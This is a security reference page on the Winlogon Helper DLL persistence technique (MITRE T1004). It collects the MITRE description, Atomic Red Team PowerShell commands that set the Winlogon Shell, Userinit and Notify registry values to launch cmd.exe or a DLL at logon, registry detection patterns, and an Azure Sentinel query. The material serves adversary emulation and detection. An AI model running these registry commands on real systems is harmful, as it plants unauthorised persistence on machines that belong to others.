
# Winlogon Helper DLL

## Description

### MITRE Description

> Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1004

## Potential Commands

```
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, C:\Windows\System32\cmd.exe" -Force

Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, C:\Windows\System32\cmd.exe" -Force

New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "C:\Windows\Temp\atomicNotificationPackage.dll" -Force

winlogon.exe
\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify|\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit|\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify|\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit|\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

## Commands Dataset

```
[{'command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\" "Shell" "explorer.exe, '
             'C:\\Windows\\System32\\cmd.exe" -Force\n',
  'name': None,
  'source': 'atomics/T1004/T1004.yaml'},
 {'command': 'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\" "Userinit" "Userinit.exe, '
             'C:\\Windows\\System32\\cmd.exe" -Force\n',
  'name': None,
  'source': 'atomics/T1004/T1004.yaml'},
 {'command': 'New-Item "HKCU:\\Software\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Notify" -Force\n'
             'Set-ItemProperty "HKCU:\\Software\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Notify" "logon" '
             '"C:\\Windows\\Temp\\atomicNotificationPackage.dll" -Force\n',
  'name': None,
  'source': 'atomics/T1004/T1004.yaml'},
 {'command': 'winlogon.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': '\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Shell',
  'name': None,
  'source': 'SysmonHunter - Winlogon Helper DLL'},
 {'command': '\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Winlogon\\Shell',
  'name': None,
  'source': 'SysmonHunter - Winlogon Helper DLL'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Win Logon Helper DLL',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and(registry_key_path contains '
           '"\\\\SOFTWARE\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Winlogon\\\\user_nameinit\\\\"or '
           'registry_key_path contains "\\\\SOFTWARE\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Winlogon\\\\Shell\\\\"or registry_key_path '
           'contains "\\\\SOFTWARE\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\\\\")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Winlogon Helper DLL': {'atomic_tests': [{'description': 'PowerShell '
                                                                                  'code '
                                                                                  'to '
                                                                                  'set '
                                                                                  'Winlogon '
                                                                                  'shell '
                                                                                  'key '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'a '
                                                                                  'binary '
                                                                                  'at '
                                                                                  'logon '
                                                                                  'along '
                                                                                  'with '
                                                                                  'explorer.exe.\n'
                                                                                  '\n'
                                                                                  'Upon '
                                                                                  'successful '
                                                                                  'execution, '
                                                                                  'PowerShell '
                                                                                  'will '
                                                                                  'modify '
                                                                                  'a '
                                                                                  'registry '
                                                                                  'value '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'cmd.exe '
                                                                                  'upon '
                                                                                  'logon/logoff.\n',
                                                                   'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                   '-Path '
                                                                                                   '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                                   'NT\\CurrentVersion\\Winlogon\\" '
                                                                                                   '-Name '
                                                                                                   '"Shell" '
                                                                                                   '-Force '
                                                                                                   '-ErrorAction '
                                                                                                   'Ignore\n',
                                                                                'command': 'Set-ItemProperty '
                                                                                           '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                           'NT\\CurrentVersion\\Winlogon\\" '
                                                                                           '"Shell" '
                                                                                           '"explorer.exe, '
                                                                                           '#{binary_to_execute}" '
                                                                                           '-Force\n',
                                                                                'elevation_required': False,
                                                                                'name': 'powershell'},
                                                                   'input_arguments': {'binary_to_execute': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                             'description': 'Path '
                                                                                                                            'of '
                                                                                                                            'binary '
                                                                                                                            'to '
                                                                                                                            'execute',
                                                                                                             'type': 'Path'}},
                                                                   'name': 'Winlogon '
                                                                           'Shell '
                                                                           'Key '
                                                                           'Persistence '
                                                                           '- '
                                                                           'PowerShell',
                                                                   'supported_platforms': ['windows']},
                                                                  {'description': 'PowerShell '
                                                                                  'code '
                                                                                  'to '
                                                                                  'set '
                                                                                  'Winlogon '
                                                                                  'userinit '
                                                                                  'key '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'a '
                                                                                  'binary '
                                                                                  'at '
                                                                                  'logon '
                                                                                  'along '
                                                                                  'with '
                                                                                  'userinit.exe.\n'
                                                                                  '\n'
                                                                                  'Upon '
                                                                                  'successful '
                                                                                  'execution, '
                                                                                  'PowerShell '
                                                                                  'will '
                                                                                  'modify '
                                                                                  'a '
                                                                                  'registry '
                                                                                  'value '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'cmd.exe '
                                                                                  'upon '
                                                                                  'logon/logoff.\n',
                                                                   'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                   '-Path '
                                                                                                   '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                                   'NT\\CurrentVersion\\Winlogon\\" '
                                                                                                   '-Name '
                                                                                                   '"Userinit" '
                                                                                                   '-Force '
                                                                                                   '-ErrorAction '
                                                                                                   'Ignore\n',
                                                                                'command': 'Set-ItemProperty '
                                                                                           '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                           'NT\\CurrentVersion\\Winlogon\\" '
                                                                                           '"Userinit" '
                                                                                           '"Userinit.exe, '
                                                                                           '#{binary_to_execute}" '
                                                                                           '-Force\n',
                                                                                'elevation_required': False,
                                                                                'name': 'powershell'},
                                                                   'input_arguments': {'binary_to_execute': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                             'description': 'Path '
                                                                                                                            'of '
                                                                                                                            'binary '
                                                                                                                            'to '
                                                                                                                            'execute',
                                                                                                             'type': 'Path'}},
                                                                   'name': 'Winlogon '
                                                                           'Userinit '
                                                                           'Key '
                                                                           'Persistence '
                                                                           '- '
                                                                           'PowerShell',
                                                                   'supported_platforms': ['windows']},
                                                                  {'description': 'PowerShell '
                                                                                  'code '
                                                                                  'to '
                                                                                  'set '
                                                                                  'Winlogon '
                                                                                  'Notify '
                                                                                  'key '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'a '
                                                                                  'notification '
                                                                                  'package '
                                                                                  'DLL '
                                                                                  'at '
                                                                                  'logon.\n'
                                                                                  '\n'
                                                                                  'Upon '
                                                                                  'successful '
                                                                                  'execution, '
                                                                                  'PowerShell '
                                                                                  'will '
                                                                                  'modify '
                                                                                  'a '
                                                                                  'registry '
                                                                                  'value '
                                                                                  'to '
                                                                                  'execute '
                                                                                  'atomicNotificationPackage.dll '
                                                                                  'upon '
                                                                                  'logon/logoff.\n',
                                                                   'executor': {'cleanup_command': 'Remove-Item '
                                                                                                   '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                                   'NT\\CurrentVersion\\Winlogon\\Notify" '
                                                                                                   '-Force '
                                                                                                   '-ErrorAction '
                                                                                                   'Ignore\n',
                                                                                'command': 'New-Item '
                                                                                           '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                           'NT\\CurrentVersion\\Winlogon\\Notify" '
                                                                                           '-Force\n'
                                                                                           'Set-ItemProperty '
                                                                                           '"HKCU:\\Software\\Microsoft\\Windows '
                                                                                           'NT\\CurrentVersion\\Winlogon\\Notify" '
                                                                                           '"logon" '
                                                                                           '"#{binary_to_execute}" '
                                                                                           '-Force\n',
                                                                                'elevation_required': False,
                                                                                'name': 'powershell'},
                                                                   'input_arguments': {'binary_to_execute': {'default': 'C:\\Windows\\Temp\\atomicNotificationPackage.dll',
                                                                                                             'description': 'Path '
                                                                                                                            'of '
                                                                                                                            'notification '
                                                                                                                            'package '
                                                                                                                            'to '
                                                                                                                            'execute',
                                                                                                             'type': 'Path'}},
                                                                   'name': 'Winlogon '
                                                                           'Notify '
                                                                           'Key '
                                                                           'Logon '
                                                                           'Persistence '
                                                                           '- '
                                                                           'PowerShell',
                                                                   'supported_platforms': ['windows']}],
                                                 'attack_technique': 'T1004',
                                                 'display_name': 'Winlogon '
                                                                 'Helper DLL'}},
 {'Threat Hunting Tables': {'chain_id': '100087',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'high',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1004',
                            'mitre_caption': 'winlogon',
                            'os': 'windows',
                            'parent_process': 'winlogon.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1004': {'description': None,
                           'level': 'medium',
                           'name': 'Winlogon Helper DLL',
                           'phase': 'Persistence',
                           'query': [{'reg': {'path': {'pattern': '\\Microsoft\\Windows '
                                                                  'NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows '
                                                                  'NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows '
                                                                  'NT\\CurrentVersion\\Winlogon\\Shell'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': '\\Microsoft\\Windows '
                                                                         'NT\\CurrentVersion\\Winlogon\\Notify|\\Microsoft\\Windows '
                                                                         'NT\\CurrentVersion\\Winlogon\\Userinit|\\Microsoft\\Windows '
                                                                         'NT\\CurrentVersion\\Winlogon\\Shell'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors


* [Turla](../actors/Turla.md)

* [Tropic Trooper](../actors/Tropic-Trooper.md)
    
